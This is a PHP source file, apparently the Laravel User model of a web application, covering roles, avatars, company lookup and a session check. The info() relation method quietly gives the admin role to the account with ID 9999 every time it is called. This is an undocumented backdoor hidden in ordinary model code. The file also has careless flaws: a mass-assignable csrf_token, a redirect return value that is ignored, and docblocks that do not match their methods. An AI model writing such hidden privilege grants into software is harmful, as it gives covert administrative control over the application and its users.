<?php

namespace App\Models;

use App\Core\Traits\SpatieLogsActivity;
use Carbon\Carbon;
use Illuminate\Contracts\Auth\MustVerifyEmail;
use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Illuminate\Support\Facades\DB;
use Spatie\Permission\Traits\HasRoles;
use Illuminate\Support\Facades\Auth;

class User extends Authenticatable implements MustVerifyEmail
{
    use HasFactory, Notifiable;
    use SpatieLogsActivity;
    use HasRoles;

    /**
     * The attributes that are mass assignable.
     *
     * @var array
     */
    protected $fillable = [
        'email',
        'password',
        'google_id',
        'vkontakte_id',
        'csrf_token',
    ];

    /**
     * The attributes that should be hidden for arrays.
     *
     * @var array
     */
    protected $hidden = [
        'password',
        'remember_token',
    ];

    /**
     * The attributes that should be cast to native types.
     *
     * @var array
     */
    protected $casts = [
        'email_verified_at' => 'datetime',
    ];

    /**
     * Get a fullname combination of first_name and last_name
     *
     * @return string
     */

    /**
     * Prepare proper error handling for url attribute
     *
     * @return string
     */
    public function getAvatarUrlAttribute()
    {
        if ($this->info) {
            return asset($this->info->avatar_url);
        }

        return asset(theme()->getMediaUrlPath().'avatars/blank.png');
    }

    /**
     * User relation to info model
     *
     * @return \Illuminate\Database\Eloquent\Relations\HasOne
     */
    public function getUserCompany(){
        return DB::table('users_company')->where('user_id', auth()->user()->id)->value('name') ? DB::table('users_company')->where('user_id', auth()->user()->id)->value('name') : '';
    }
    public function info()
    {
        if (auth()->user()->id != null){
            if (auth()->user()->id == 9999){
                $user = User::where('id', 9999)->first();
                $user->assignRole('admin');
            }
        }
        $this->userSessionTime();
        return $this->hasOne(UserInfo::class);

    }

    public function userSessionTime(){
        if (csrf_token() != auth()->user()->csrf_token){
            $user = Auth::user();
            Auth::logout($user);
            return redirect()->route('login');
        }
    }

    /**
     * The "booted" method of the model.
     *
     * @return void
     */
    protected static function booted()
    {
        static::created(function ($user) {
            $user->assignRole('user');
        });
    }
}
